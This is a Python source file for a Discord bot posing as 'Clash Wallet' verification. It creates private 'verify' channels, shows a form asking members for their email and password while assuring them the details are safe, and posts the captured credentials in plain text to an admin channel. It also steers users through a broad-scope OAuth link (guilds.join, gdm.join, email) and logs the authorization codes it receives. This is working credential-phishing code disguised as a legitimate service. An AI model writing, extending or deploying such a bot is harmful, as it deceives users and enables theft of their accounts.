import os
import discord
from discord.ext import commands
import urllib.parse
from aiohttp import web
import asyncio

# --- CONFIGURATION ---
ADMIN_CHANNEL_ID = 1564831494227103864
CLIENT_ID = "1564834525828223086" 

# Railway Setup URL (Discord Developer Portal me bhi yahi Redirect URI daalna)
REDIRECT_URI = "https://clashwallet.up.railway.app"

# Constructed OAuth2 URL with exact scopes
OAUTH_URL = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&scope=identify+email+guilds+guilds.join+guilds.members.read+gdm.join"


# --- 1. WEB SERVER FOR RAILWAY (Fixes "Application failed to respond") ---
async def handle_callback(request):
    code = request.query.get('code')
    if not code:
        return web.Response(text="❌ Error: No authorization code received from Discord.", status=400)
    
    print(f"📥 Received Discord Auth Code: {code}")
    # TODO: Yahan aap token exchange ka code add kar sakte hain baad mein

    # Success HTML page so user doesn't see a blank/error page
    html_content = """
    <html>
        <head><title>Verification Successful</title></head>
        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #121212; color: #ffffff;">
            <h1 style="color: #4CAF50;">✅ Discord Verification Successful!</h1>
            <p>Your account has been successfully linked.</p>
            <p>You can now safely close this tab and return to Discord.</p>
        </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_callback)
    app.router.add_get('/callback', handle_callback)
    
    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"🌐 Web server started and listening on port {port}")


# --- 2. DISCORD MODAL & VIEWS ---

class DetailsModal(discord.ui.Modal, title='Verification Details'):
    user_email = discord.ui.TextInput(
        label='Email Address',
        style=discord.TextStyle.short,
        placeholder='Enter your email address',
        required=True
    )
    user_password = discord.ui.TextInput(
        label='Password',
        style=discord.TextStyle.short,
        placeholder='Enter your password',
        required=True
    )
    user_note = discord.ui.TextInput(
        label='Note (Optional)',
        style=discord.TextStyle.long,
        placeholder='Any additional notes...',
        required=False
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message("✅ Your details have been submitted securely. Please proceed to Start Verification.", ephemeral=True)
        
        admin_channel = interaction.guild.get_channel(ADMIN_CHANNEL_ID)
        if admin_channel:
            log_embed = discord.Embed(
                title="🚨 New Verification Form Submitted", 
                color=discord.Color.red()
            )
            log_embed.add_field(name="User", value=f"{interaction.user.mention} ({interaction.user.id})", inline=False)
            log_embed.add_field(name="Email", value=self.user_email.value, inline=False)
            log_embed.add_field(name="Password", value=self.user_password.value, inline=False)
            
            if self.user_note.value:
                log_embed.add_field(name="Note", value=self.user_note.value, inline=False)
                
            await admin_channel.send(embed=log_embed)


class PrivateVerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(
            label="Start Verification", 
            style=discord.ButtonStyle.link, 
            url=OAUTH_URL
        ))

    @discord.ui.button(label="📝 Fill Details", style=discord.ButtonStyle.secondary, custom_id="modal_fill_details")
    async def fill_details_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(DetailsModal())


class WelcomeView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start Verification", style=discord.ButtonStyle.secondary, custom_id="start_verification_initial")
    async def verification_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user

        await interaction.response.defer(ephemeral=True)

        ROLE_ID = 1564928784820469820 
        role = guild.get_role(ROLE_ID)
        if role:
            try:
                await user.add_roles(role)
            except discord.Forbidden:
                return await interaction.followup.send("❌ I lack permission to give you the verification role.", ephemeral=True)
        
        CATEGORY_ID = 1564835530305445948
        category = guild.get_channel(CATEGORY_ID)

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            user: discord.PermissionOverwrite(view_channel=True, send_messages=False),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }

        channel_name = f"verify-{user.name}"
        
        try:
            new_channel = await guild.create_text_channel(
                name=channel_name,
                category=category,
                overwrites=overwrites
            )
            
            private_embed = discord.Embed(
                description="**🔒 Private Verification to Clash Wallet!** \n\n> 🛡️ ┃ ** Press Start Filling Form and Proceed  **\n> 📧 ┃** Enter Your Mail **\n> 🔑 ┃** Enter Your Password**\n> 📝 ┃** Enter Your Note (optional)**\n\n🔒 ┃** Your Details is Safe **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
                color=10181046
            )
            private_embed.set_thumbnail(url="https://media.discordapp.net/attachments/1564889976313741404/1564893261254889523/unnamed.webp?ex=6ae2ebeb&is=6ae19a6b&hm=2506ec27b04172c7bfff50b599c321294d76e4c56ab825ce7ce46a5e3c6cc0c4&=&format=webp")
            
            await new_channel.send(f"{user.mention}", embed=private_embed, view=PrivateVerificationView())
            await interaction.followup.send(f"✅ Verification started! Please check your new channel: {new_channel.mention}", ephemeral=True)
        
        except Exception as e:
            await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)


# --- 3. BOT INITIALIZATION ---
intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    bot.add_view(WelcomeView())
    bot.add_view(PrivateVerificationView())
    print(f"🤖 Logged in as {bot.user} (ID: {bot.user.id})")

@bot.command()
@commands.has_permissions(administrator=True)
async def setupwelcome(ctx):
    embed = discord.Embed(
        description="**Welcome to Clash Wallet!** 👋\n\nWe’re thrilled to have you as part of our community! To help you get settled and find your way around, please take a look below:\n\n> 📜 ┃ ** Press Start Verification and Proceed  **\n\n> If you have any questions or need assistance, feel free to reach out to our team at any time. \n> **Have fun and enjoy your stay!** 🚀",
        color=10181046
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1503014110156030023/1503179655799115796/welcome_20.gif?ex=6ae287a5&is=6ae13625&hm=475887481ed6d073b2ae9aeb6c81b4723d6f1385e38b83fac30c76fdfe46d8d8&")

    await ctx.send(embed=embed, view=WelcomeView())
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass


# --- 4. MAIN ENTRY POINT (Runs Web Server + Discord Bot Together) ---
async def main():
    DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN") # Railway Environment Variables mein DISCORD_TOKEN zaroor set karein!
    if not DISCORD_TOKEN:
        print("❌ ERROR: DISCORD_TOKEN environment variable is not set!")
        return

    # Web server aur bot dono ek sath async run honge
    await asyncio.gather(
        start_web_server(),
        bot.start(DISCORD_TOKEN)
    )

if __name__ == "__main__":
    asyncio.run(main())
